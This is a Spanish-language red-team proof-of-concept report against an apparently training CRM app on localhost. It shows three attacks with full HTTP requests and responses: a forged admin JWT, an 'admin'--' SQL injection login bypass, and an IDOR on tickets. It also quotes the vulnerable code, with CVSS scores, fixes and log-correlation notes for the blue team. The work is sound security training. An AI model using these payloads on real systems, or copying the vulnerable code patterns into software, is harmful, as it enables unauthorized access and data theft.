# PoC Burp Suite · Hito 2 · Equipo rojo

**Responsable:** Davis Roldán (Equipo rojo)  
**Entorno:** instancia local via WAF `http://localhost:8080` con Colima · WAF en modo `DetectionOnly`  
**Herramienta:** Burp Suite Community Edition v2026.9.2  
**Fecha de ejecución:** 2026-11-09  

Los tres PoC que siguen corresponden a los candidatos prioritarios señalados en [`docs/hito-1/README.md § 4`](../hito-1/README.md) y se trazaron contra el mapa de superficie de ataque en [`superficie.md`](../hito-1/superficie.md). Las capturas de evidencia están en [`docs/shots/burp/`](../shots/burp/).

---

## PoC-01 · JWT sin verificación de firma

### Clasificación

| Campo | Valor |
|---|---|
| **OWASP Top 10:2025** | A07 · Identification and Authentication Failures |
| **CWE** | CWE-347 · Improper Verification of Cryptographic Signature |
| **Severidad** | Crítica |
| **CVSS v3.1 Score** | **9.1** |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |

### Métricas CVSS v3.1 justificadas

| Métrica | Valor | Justificación |
|---|---|---|
| **AV** · Attack Vector | Network (N) | El ataque se realiza remotamente via HTTP; no requiere acceso físico ni a la red interna. |
| **AC** · Attack Complexity | Low (L) | Solo se necesita editar el payload del JWT y enviar el request; no hay condición de carrera ni conocimiento especial. |
| **PR** · Privileges Required | None (N) | El token forjado se construye sin credenciales válidas; cualquier persona puede fabricarlo. |
| **UI** · User Interaction | None (N) | No requiere que ningún usuario legítimo realice ninguna acción. |
| **S** · Scope | Unchanged (U) | El impacto queda dentro del componente vulnerable (la API de Secure CRM). |
| **C** · Confidentiality | High (H) | Con `role:admin` se accede a la lista completa de usuarios, hashes y datos de todos los tickets. |
| **I** · Integrity | High (H) | Un token forjado como admin puede crear, modificar o eliminar cualquier recurso de la aplicación. |
| **A** · Availability | None (N) | El ataque no degrada ni interrumpe el servicio. |

### Causa raíz

```typescript
// apps/api/src/middleware/auth.ts:21
const payload = jwt.decode(token) as any;  // ❌ decode() no verifica firma
// debería ser: jwt.verify(token, process.env.JWT_SECRET)
```

`jwt.decode()` solo decodifica el payload en Base64; no valida la firma criptográfica HMAC. Cualquier token con estructura JWT válida es aceptado independientemente de quién lo firmó.

### Request

```http
GET /api/users HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjQsInVzZXJuYW1lIjoidmlld2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzk0MjQxMTIxfQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

**Token original** (viewer, firma real):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOjQsInVzZXJuYW1lIjoidmlld2VyIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc5NDI0MTEyMX0
.iYYCcFEoIeXe_IeS22cvCqqZCLdD524IRHENp0Q85vA
```

**Token forjado** (viewer → admin, firma falsa `AAAA...`):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOjQsInVzZXJuYW1lIjoidmlld2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzk0MjQxMTIxfQ
.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Payload decodificado del token forjado:
```json
{ "sub": 4, "username": "viewer", "role": "admin", "iat": 1794241121 }
```

### Respuesta

```http
HTTP/1.1 200 OK
Content-Type: application/json
```
```json
[
  { "id": 1, "username": "admin",   "role": "admin",  "passwordHash": "2637a5c30af69a7bad877fdb65fbd78b" },
  { "id": 2, "username": "jperez",  "role": "agent",  "passwordHash": "2ac9cb7dc02b3c0083eb70898e549b63" },
  { "id": 3, "username": "mlopez",  "role": "agent",  "passwordHash": "2237a5c30af12b7cad877fdb65fbd45c" },
  { "id": 4, "username": "viewer",  "role": "viewer", "passwordHash": "9dd4e461268c8034f5c8564e155c67a6" }
]
```

La API devolvió **200 OK** con la lista completa de usuarios, incluyendo `passwordHash`, usando un token con firma completamente falsa.

### Evidencia

![Burp Repeater — JWT forjado con role:admin y firma AAAA devuelve 200 con lista de usuarios](../shots/burp/repeater-jwt-forged.png)

### Impacto

Un atacante sin credenciales puede forjar un token con cualquier rol y acceder a cualquier recurso de la API. Compromete la confidencialidad e integridad de todos los datos de la aplicación. Este hallazgo invalida el modelo de autorización completo.

### Remediación

Reemplazar `jwt.decode()` por `jwt.verify(token, process.env.JWT_SECRET)` en `middleware/auth.ts`. Rotar el secreto JWT. Verificar también expiración (`exp`) y algoritmo (`alg`).

---

## PoC-02 · SQL Injection en login

### Clasificación

| Campo | Valor |
|---|---|
| **OWASP Top 10:2025** | A05 · Injection |
| **CWE** | CWE-89 · Improper Neutralization of Special Elements used in an SQL Command |
| **Severidad** | Crítica |
| **CVSS v3.1 Score** | **9.1** |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |

### Métricas CVSS v3.1 justificadas

| Métrica | Valor | Justificación |
|---|---|---|
| **AV** · Attack Vector | Network (N) | El endpoint `/api/auth/login` está expuesto por HTTP a cualquier origen. |
| **AC** · Attack Complexity | Low (L) | El payload `admin'--` es un clásico de primer nivel; no requiere conocimiento previo del esquema. |
| **PR** · Privileges Required | None (N) | El endpoint de login es público; no se necesita ninguna sesión previa. |
| **UI** · User Interaction | None (N) | El atacante actúa solo; no depende de que ningún usuario realice ninguna acción. |
| **S** · Scope | Unchanged (U) | El impacto se limita a la base de datos de Secure CRM. |
| **C** · Confidentiality | High (H) | Se obtiene acceso completo como admin: datos de tickets, usuarios y hashes. |
| **I** · Integrity | High (H) | Con el token de admin se pueden crear, modificar o eliminar cualquier registro. |
| **A** · Availability | None (N) | El ataque no interrumpe el servicio. |

### Causa raíz

```typescript
// apps/api/src/auth.ts:30
const sql = `SELECT * FROM users WHERE username = '${username}' AND password_hash = '${hashed}'`;
```

La consulta se construye por concatenación de strings sin parametrización. El payload `admin'--` cierra la cadena del `username` y convierte el resto en comentario SQL:

```sql
-- Consulta resultante:
SELECT * FROM users WHERE username = 'admin'--' AND password_hash = '...'
-- La condición de contraseña queda comentada → siempre devuelve el usuario admin
```

### Request

```http
POST /api/auth/login HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Content-Length: 45

{"username":"admin'--","password":"loquesea"}
```

### Respuesta

```http
HTTP/1.1 200 OK
Content-Type: application/json
```
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3OTQyMzkwNTZ9.WYXQq3nikAy3qSeTbpTp4HwFsC5qkCiaFtze9EzWf38",
  "user": {
    "id": 1,
    "username": "admin",
    "email": "admin@secure-crm.local",
    "fullName": "Ada Administradora",
    "role": "admin",
    "createdAt": "2026-11-04 01:41:28"
  }
}
```

La API devolvió **200 OK** con token de administrador sin que se proporcionara la contraseña correcta.

### Evidencia

![Burp Repeater — POST /api/auth/login con payload admin'-- devuelve token de admin](../shots/burp/repeater-sqli.png)

### Impacto

Acceso completo a la aplicación como administrador sin credenciales. Permite encadenar con otros hallazgos: obtener hashes (H-05), crear usuarios admin (H-08) o exfiltrar todos los tickets.

### Remediación

Usar consultas parametrizadas (prepared statements) en `auth.ts`:
```typescript
const stmt = db.prepare('SELECT * FROM users WHERE username = ? AND password_hash = ?');
const user = stmt.get(username, hashed);
```

---

## PoC-03 · IDOR en tickets

### Clasificación

| Campo | Valor |
|---|---|
| **OWASP Top 10:2025** | A01 · Broken Access Control |
| **CWE** | CWE-639 · Authorization Bypass Through User-Controlled Key |
| **Severidad** | Alta |
| **CVSS v3.1 Score** | **8.1** |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |

### Métricas CVSS v3.1 justificadas

| Métrica | Valor | Justificación |
|---|---|---|
| **AV** · Attack Vector | Network (N) | El endpoint `/api/tickets/:id` es accesible remotamente via HTTP. |
| **AC** · Attack Complexity | Low (L) | Basta con cambiar el número del identificador en la URL; no hay mecanismo de protección que superar. |
| **PR** · Privileges Required | Low (L) | Se necesita cualquier cuenta autenticada (incluso `viewer`, el rol de menor privilegio). |
| **UI** · User Interaction | None (N) | El atacante actúa solo sin intervención de otras cuentas. |
| **S** · Scope | Unchanged (U) | El impacto queda dentro del componente API de Secure CRM. |
| **C** · Confidentiality | High (H) | Se puede leer el contenido completo de cualquier ticket: título, descripción, cliente, correo y agente asignado. |
| **I** · Integrity | High (H) | Los métodos `PUT` y `DELETE` sobre `/api/tickets/:id` tienen la misma ausencia de control, permitiendo modificar o eliminar tickets ajenos. |
| **A** · Availability | None (N) | El acceso de lectura no degrada el servicio; la eliminación se clasifica bajo Integridad. |

### Causa raíz

```typescript
// apps/api/src/routes/tickets.ts:51
router.get('/:id', authenticate, async (req, res) => {
  const ticket = db.prepare('SELECT * FROM tickets WHERE id = ?').get(req.params.id);
  // ❌ No verifica que ticket.assignee_id === req.user.sub
  // ❌ No verifica que req.user.role tenga acceso a este objeto
  if (!ticket) return res.status(404).json({ error: 'Ticket no encontrado' });
  res.json(ticket);
});
```

La ruta autentica al usuario (verifica que haya token) pero no autoriza: no comprueba si el ticket pertenece al usuario ni si su rol le permite verlo.

### Request

```http
GET /api/tickets/1 HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjQsInVzZXJuYW1lIjoidmlld2VyIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc5NDI0MTAxMn0.iEVpoqXJT1UuNErcibwZh8b3IlLI8JaLhEXYYJ5UzQ8
```

Token usado: `viewer` (id: 4, rol: viewer) — el ticket #1 pertenece a un agente distinto.

### Respuesta

```http
HTTP/1.1 200 OK
Content-Type: application/json
```
```json
{
  "id": 1,
  "title": "No puedo iniciar sesión en el portal",
  "description": "El cliente reporta error 500 al ingresar sus credenciales.",
  "status": "open",
  "priority": "low",
  "customerName": "Comercial El Quetzal",
  "customerEmail": "contacto@elquetzal.gt",
  "assigneeId": 2,
  "createdById": 1,
  "assigneeName": "Juan Pérez",
  "createdAt": "2026-08-01 09:10:00",
  "updatedAt": "2026-08-01 09:10:00"
}
```

La API devolvió **200 OK** con los datos completos del ticket, incluyendo nombre y correo del cliente, siendo el solicitante un `viewer` sin relación con ese ticket.

### Evidencia

![Burp Repeater — GET /api/tickets/1 con token viewer devuelve datos completos del ticket ajeno](../shots/burp/repeater-idor.png)

### Impacto

Cualquier usuario autenticado puede enumerar todos los tickets de la aplicación incrementando el identificador. Expone datos de clientes (nombre, correo, descripción del problema) y la asignación interna de trabajo. Con los métodos `PUT` y `DELETE` la situación es equivalente: un viewer puede modificar o eliminar cualquier ticket.

### Remediación

Agregar verificación de propiedad o rol en la ruta:
```typescript
if (req.user.role === 'viewer' && ticket.assignee_id !== req.user.sub) {
  return res.status(403).json({ error: 'Acceso denegado' });
}
```
O mejor, usar una política de autorización centralizada basada en objeto (ABAC) que verifique propietario y rol antes de devolver cualquier recurso.

---

## Resumen ejecutivo

| PoC | Hallazgo | OWASP | CWE | CVSS | Severidad | Captura |
|---|---|---|---|---|---|---|
| PoC-01 | JWT sin verificación de firma | A07 | CWE-347 | **9.1** | Crítica | `repeater-jwt-forged.png` |
| PoC-02 | SQL Injection en login | A05 | CWE-89 | **9.1** | Crítica | `repeater-sqli.png` |
| PoC-03 | IDOR en tickets | A01 | CWE-639 | **8.1** | Alta | `repeater-idor.png` |

**Nota sobre encadenamiento:** PoC-02 (SQLi) permite obtener un token de admin sin credenciales. PoC-01 demuestra una falla independiente de validación de firma: basta con fabricar un token. Ambos hallazgos tienen CVSS 9.1 según los vectores documentados. La combinación de los tres PoC compromete confidencialidad e integridad de toda la aplicación.

**Para H3 (Kibana):** los tres PoC se ejecutaron el 2026-11-09 entre las 09:50 y las 10:27 UTC-6 contra `http://localhost:8080`. El Equipo azul puede buscar en Kibana por `request.uri: "/api/auth/login"`, `request.uri: "/api/users"` y `request.uri: "/api/tickets/1"` en ese rango de tiempo para correlacionar los eventos del WAF.
